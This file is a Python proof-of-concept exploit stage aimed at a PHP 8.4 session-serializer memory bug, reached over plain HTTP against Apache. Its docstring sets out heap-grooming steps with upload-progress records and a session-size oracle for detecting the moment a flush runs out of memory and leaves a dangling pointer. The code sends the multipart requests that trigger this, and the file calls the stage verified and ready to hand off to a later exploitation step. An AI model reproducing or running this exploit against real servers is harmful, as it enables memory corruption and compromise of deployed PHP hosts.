#!/usr/bin/env python3 -I
# INDEX: seat BG(serialize) dangle over pure HTTP | apache | flush encode-OOM at the flush-ceiling
"""Pure-HTTP BG(serialize) dangle seat (CVE-2026-109619, the advisory's "serializer globals").

A session FLUSH whose php_var_serialize OOMs skips php_var_serialize_destroy, so BG(serialize)
(basic_globals+0x358 .data / +0x360 .level -- the serialize reuse struct mirroring
BG(unserialize)+0x368) is left pointing at the freed php_serialize_data {HashTable ht; uint32_t n};
the Apache worker survives and the next flush's php_var_serialize_init takes the REUSE branch and
walks it. The encode-OOM sits at the flush-ceiling (~limit/3), which HTTP accumulation reaches, so
the dangle seats with no docker-exec seed (unlike the decode-OOM at ~limit/2).

arm() accumulates groom.upload_progress_accumulate records -- clean_request_reset interleaved to
defeat the surviving-worker allocator churn -- until a round's flush encode-OOMs, detected
black-box by the on-disk session size stalling (the OOMed flush writes no new record). It does NOT
reset after that round (a clean request would re-pair BG(serialize)); the arm sid's flock is then
leaked, so the consumer reuses the dangle on a different sid.

API:
  arm(host, port, sid, size_probe, *, fnlen=400000, wall=5000, max_rounds=45, boundary=b"apsfof")
    -> the round index whose flush encode-OOMed (BG(serialize) dangling), or None if no stall.
    size_probe(sid) -> int on-disk session size (the black-box stall oracle).
Tested: php:8.4.26-apache @32M (lab/apsf --profile apsf32).
Stage: VERIFIED (dangle seat + next-flush reuse, worker survives).
"""
import os
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common import http_raw as H  # noqa: E402
from common.multipart import part as mp_part, terminator  # noqa: E402
from primitives.groom.upload_progress_accumulate import record_parts  # noqa: E402
from primitives.groom import clean_request_reset  # noqa: E402

SER_DATA_OFF = 0x358
SER_LEVEL_OFF = 0x360


def _round(host, port, sid, index, fnlen, wall, boundary):
    parts = [(b"PHPSESSID", sid.encode(), None)] + record_parts(index, fnlen, wall)
    body = b"".join(mp_part(n, v, filename=fn, ctype="application/octet-stream", boundary=boundary)
                    for n, v, fn in parts) + terminator(boundary)
    return H.send_multipart_chunked(host, port, "/plain.php", body, boundary, 12)


def arm(host, port, sid, size_probe, *, fnlen=400000, wall=5000, max_rounds=45, boundary=b"apsfof"):
    """Accumulate until a round's flush encode-OOMs (size stalls) -> BG(serialize) dangling, no
    reset after. Returns that round index, or None."""
    prev = -1
    for i in range(1, max_rounds + 1):
        _round(host, port, sid, i, fnlen, wall, boundary)
        cur = size_probe(sid)
        if cur == prev and cur > 0:
            return i
        prev = cur
        clean_request_reset.reset(host, port)
    return None
